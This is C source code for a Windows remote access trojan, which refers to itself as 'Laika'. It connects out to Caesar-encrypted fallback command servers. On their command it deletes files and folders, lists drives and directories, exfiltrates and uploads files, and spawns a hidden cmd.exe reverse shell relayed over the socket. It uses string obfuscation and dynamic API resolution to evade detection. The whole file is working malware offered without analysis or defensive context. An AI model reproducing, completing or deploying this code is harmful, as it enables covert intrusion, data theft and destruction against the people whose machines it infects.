#include <Windows.h>
#include <shlobj_core.h>
#include <wininet.h>
#include <stdio.h>
#include "utils.h"
#include "config.h"
#include "resolve_apis.h"
#include "file_explorer.h"

HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;

extern API Api;

#define BUFFER_SIZE 4096

DWORD WINAPI redirect_i_thread(LPVOID lpParameter) {
	SOCKET sock = (SOCKET)lpParameter;
	char* buffer = (char*)Api.malloc(BUFFER_SIZE);
	DWORD bytesRead;

	while (1) {
		//Read data from the socket
		Api.memset(buffer, 0, BUFFER_SIZE);
		bytesRead = Api.recv(sock, buffer, BUFFER_SIZE, 0);
		if (bytesRead > 0) {
			Api.WriteFile(g_hChildStd_IN_Wr, CAESAR_DECRYPT(buffer), bytesRead, NULL, NULL);
			//Api.WriteFile(g_hChildStd_IN_Wr, buffer, bytesRead, NULL, NULL);
		}
		else if (bytesRead == SOCKET_ERROR) {
			break;
		}
		else {
			Sleep_(50);
		}
	}

	Api.free(buffer);
	return 0;
}

DWORD WINAPI redirect_o_thread(LPVOID lpParameter) {
	SOCKET sock = (SOCKET)lpParameter;
	char* buffer = (char*)Api.malloc(BUFFER_SIZE);
	DWORD bytesRead;

	while (1) {
		// Read data from the child process's stdout pipe
		if (Api.ReadFile(g_hChildStd_OUT_Rd, buffer, BUFFER_SIZE, &bytesRead, NULL)) {
			Api.send(sock, CAESAR(buffer), bytesRead, 0);
			//Api.send(sock, buffer, bytesRead, 0);
		}
		else {
			DWORD error = Api.GetLastError();
			if (error == ERROR_BROKEN_PIPE) {
				//pipe closed by the process
				break;
			}
		}
	}

	Api.free(buffer);
	return 0;
}

typedef struct t_watch_process_args {
	SOCKET sock;
	HANDLE process;
}watch_process_args;

int should_reset = 0;
DWORD WINAPI watch_process(LPVOID lpParameter) {
	watch_process_args* args = (watch_process_args*)(lpParameter);

	char buffer[1]; // buffer to hold the data
	int n;

	while (1) {
		n = Api.recv(args->sock, buffer, sizeof(buffer), MSG_PEEK);
		if (n > 0) {
			// There is data available on the socket, so the connection is still alive
		}
		else if (n == 0) {
			// The connection has been closed
			break;
		}
		else {
			// An error occurred
			break;
		}
	}

	Api.TerminateProcess(args->process, -1);
	should_reset = 1;

	return 0;
}

void SendShellEndedSignal(SOCKET sock) {
	if (Api.send(sock, "Qfnpf?%xjxxnts%jsiji", strlen("Qfnpf?%xjxxnts%jsiji"), 0) < 0) //Laika: session ended
	{
		//send failed
	}
}

int serv = -1;
int main() {
	InitApis();

	Message();

	Tmemset memset = Api.memset;

	wchar_t wtext[20];
	Api.mbstowcs(wtext, CAESAR_DECRYPT("hri3j}j"), strlen(CAESAR_DECRYPT("hri3j}j")) + 1);//Plus null
	LPWSTR cmd_char = wtext;

	int sock;
	int first = 1;
	struct sockaddr_in server;
	char* server_reply = (char*)Api.malloc(BUFFER_SIZE);
	server.sin_family = AF_INET;

	WORD wVersionRequested = MAKEWORD(2, 2);
	WSADATA wsaData;
	Api.WSAStartup(wVersionRequested, &wsaData);

retry:
	if (!first) {
		Api.closesocket(sock);
	}
	else {
		first = 0;
	}

	serv++;
	if (serv > FALLBACK_SERVERS - 1) {
		serv = 0;
	}

	//on fait une copie de l'ip chiffrée, puis on la free
	//ça évite qu'elle reste dans la mémoire trop longtemps
	//ça évite aussi qu'on utilise CAESAR_DECRYPT sur une ip déjà décryptée
	size_t len = strlen(fallback_servers[serv]);
	char* Tmp = Api.malloc(len + 1);
	Api.strcpy(Tmp, fallback_servers[serv]);

	server.sin_addr.s_addr = Api.inet_addr(CAESAR_DECRYPT(Tmp));

	Api.free(Tmp);

	server.sin_port = Api.htons(fallback_servers_ip[serv]);

	//Create socket
	sock = Api.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == -1)
	{
		Sleep_(Sleep_TIME);
		goto retry;
	}

	//Connect to remote server
	if (Api.connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0)
	{
		//connect failed
		Sleep_(Sleep_TIME);
		goto retry;
	}

	//keep communicating with server
	while (1)
	{
		Api.memset(server_reply, 0, BUFFER_SIZE);

		//Receive a reply from the server
		if (Api.recv(sock, server_reply, BUFFER_SIZE, 0) <= 0)
		{
			//recv failed
			Sleep_(Sleep_TIME);
			goto retry;
		}

		if (Api.strncmp(server_reply, "ijqdknqj", strlen("ijqdknqj")) == 0) { //del_file
			char* path = (char*)Api.malloc(MAX_PATH);

			//Receive a reply from the server
			if (Api.recv(sock, path, MAX_PATH, 0) <= 0)
			{
				//recv failed
				Api.free(path);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			Api.remove(CAESAR_DECRYPT(path));

			Api.free(path);
		}

		if (Api.strncmp(server_reply, "ijqdinw", strlen("ijqdinw")) == 0) { //del_dir
			char* path = (char*)Api.malloc(MAX_PATH);

			//Receive a reply from the server
			if (Api.recv(sock, path, MAX_PATH, 0) <= 0)
			{
				//recv failed
				Api.free(path);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			LPCWSTR wstr = ConvertCharToWChar(CAESAR_DECRYPT(path));

			delete_folder(wstr);

			Api.free((LPWSTR)wstr);
			Api.free(path);
		}

		if (Api.strncmp(server_reply, "ljydtgodnskt", strlen("ljydtgodnskt")) == 0) { //get_obj_info
			char* path = (char*)Api.malloc(MAX_PATH);
			struct stat fileinfo;

			//Receive a reply from the server
			if (Api.recv(sock, path, MAX_PATH, 0) <= 0)
			{
				//recv failed
				Api.free(path);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			int st = Api.stat(CAESAR_DECRYPT(path), &fileinfo);
			if (st != 0) {

				if (Api.send(sock, "N/N", strlen("N/N"), 0) < 0) {
					//send failed
					Api.free(path);
					Sleep_(Sleep_TIME);
					goto retry;
				}

				Api.free(path);
				continue;
			}

			time_t mtime = fileinfo.st_mtime;
			struct tm* mtime_tm = Api.localtime(&mtime);
			char mtime_str[30];
			char sizeStr[20];
			Api.strftime(mtime_str, 30, "%Y-%m-%d %H:%M:%S", mtime_tm);

			// Concatenate the file size and modified time strings separated by "/"
			Api._snprintf(sizeStr, 20, "%lld", (long long)fileinfo.st_size);
			int bufferSize = strlen(sizeStr) + 1 + strlen(mtime_str) + 1; // add 1 for the separator and the null terminator
			char* fileInfoStr = (char*)Api.malloc(bufferSize);
			Api._snprintf(fileInfoStr, bufferSize, "%s/%s", sizeStr, mtime_str);

			if (Api.send(sock, fileInfoStr, strlen(fileInfoStr), 0) < 0) {
				//send failed
				Api.free(path);
				Api.free(fileInfoStr);
				Sleep_(Sleep_TIME);
				goto retry;
			}
			
			Api.free(fileInfoStr);
			Api.free(path);
		}

		if (Api.strncmp(server_reply, "ljydiwn{jx", strlen("ljydiwn{jx")) == 0) { //get_drives
			char* drives = (char*)Api.malloc(MAX_PATH);

			get_drives_list(drives);

			if (Api.send(sock, drives, strlen(drives), 0) < 0) {
				//send failed
				Api.free(drives);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			Api.free(drives);
		}

		if (Api.strncmp(server_reply, "ljydknqjdqnxy", strlen("ljydknqjdqnxy")) == 0) { //get_file_list
			char* file_list = (char*)Api.malloc(BUFFER_SIZE);
			char* path = (char*)Api.malloc(MAX_PATH);

			//Receive a reply from the server
			if (Api.recv(sock, path, MAX_PATH, 0) <= 0)
			{
				//recv failed
				Api.free(file_list);
				Api.free(path);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			int num_files;
			file_list = get_file_list(CAESAR_DECRYPT(path), &num_files);

			if (file_list == NULL) {
				Api.free(file_list);
				Api.free(path);
				Sleep_(Sleep_TIME);
				goto retry;
			}


			if (Api.send(sock, file_list, strlen(file_list), 0) < 0) {
				//send failed
				Api.free(file_list);
				Api.free(path);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			Api.free(path);
		}

		if (Api.strncmp(server_reply, "it|sqtfidknqj", strlen("it|sqtfidknqj")) == 0) { //download_file
			char* path = (char*)Api.malloc(MAX_PATH);

			//Receive a reply from the server
			if (Api.recv(sock, path, MAX_PATH, 0) <= 0)
			{
				//recv failed
				Api.free(path);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			FILE* fp = Api.fopen(CAESAR_DECRYPT(path), "rb");
			Api.free(path);

			if (fp == NULL)
			{
				Sleep_(Sleep_TIME);
				goto retry;
			}

			if (download_file(fp, sock) == 0) {
				Sleep_(Sleep_TIME);
				goto retry;
			}
		}

		if (Api.strncmp(server_reply, "zuqtfidknqj", strlen("zuqtfidknqj")) == 0) { //upload_file
			char* path = (char*)Api.malloc(MAX_PATH);

			//Receive a reply from the server
			if (Api.recv(sock, path, MAX_PATH, 0) <= 0)
			{
				//recv failed
				Api.free(path);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			upload_file(sock, CAESAR_DECRYPT(path));

			Api.free(path);
		}

		if (Api.strncmp(server_reply, "xmjqq", strlen("xmjqq")) == 0) { //shell
			// Set the socket as standard output and error
			SECURITY_ATTRIBUTES sa;
			sa.nLength = sizeof(SECURITY_ATTRIBUTES);
			sa.bInheritHandle = TRUE;
			sa.lpSecurityDescriptor = NULL;
			if (!Api.CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &sa, 0)) {
				SendShellEndedSignal(sock);
				Sleep_(Sleep_TIME);
				goto retry;
			}
			if (!Api.CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &sa, 0)) {
				SendShellEndedSignal(sock);
				Sleep_(Sleep_TIME);
				goto retry;
			}

			// Create a thread to read from the pipes and write to the socket
			HANDLE hThread = Api.CreateThread(NULL, 0, &redirect_i_thread, (LPVOID)sock, 0, NULL);
			HANDLE hThread2 = Api.CreateThread(NULL, 0, &redirect_o_thread, (LPVOID)sock, 0, NULL);

			// Create the process
			STARTUPINFO si;
			ZeroMemory(&si, sizeof(STARTUPINFO));
			si.cb = sizeof(STARTUPINFO);
			si.hStdError = g_hChildStd_OUT_Wr;
			si.hStdOutput = g_hChildStd_OUT_Wr;
			si.hStdInput = g_hChildStd_IN_Rd;
			si.dwFlags |= STARTF_USESTDHANDLES;

			PROCESS_INFORMATION pi;
			ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

			if (!Api.CreateProcessW(NULL, cmd_char, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { //cmd.exe
				SendShellEndedSignal(sock);
				Api.CloseHandle(g_hChildStd_OUT_Wr);
				Api.CloseHandle(g_hChildStd_IN_Rd);

				if (hThread != NULL) {
					Api.TerminateThread(hThread, 0);
					Api.CloseHandle(hThread);
				}
				if (hThread2 != NULL) {
					Api.TerminateThread(hThread2, 0);
					Api.CloseHandle(hThread2);
				}

				Sleep_(Sleep_TIME);
				goto retry;
			}

			watch_process_args args = { sock, pi.hProcess };
			HANDLE hThread3 = Api.CreateThread(NULL, 0, &watch_process, &args, 0, NULL);

			// Wait for the process to finish
			Api.WaitForSingleObject(pi.hProcess, INFINITE);

			SendShellEndedSignal(sock);

			// Close the handles
			Api.CloseHandle(pi.hProcess);
			Api.CloseHandle(pi.hThread);
			Api.CloseHandle(g_hChildStd_OUT_Wr);
			Api.CloseHandle(g_hChildStd_IN_Rd);

			if (hThread != NULL) {
				Api.TerminateThread(hThread, 0);
				Api.CloseHandle(hThread);
			}
			if (hThread2 != NULL) {
				Api.TerminateThread(hThread2, 0);
				Api.CloseHandle(hThread2);
			}
			if (hThread3 != NULL) {
				Api.TerminateThread(hThread3, 0);
				Api.CloseHandle(hThread3);
			}

			if (should_reset) {
				should_reset = 0;
				goto retry;
			}
		}
	}
	/* Never used
	Api.closesocket(sock);

	FreeApis();
	*/
	return 0;
}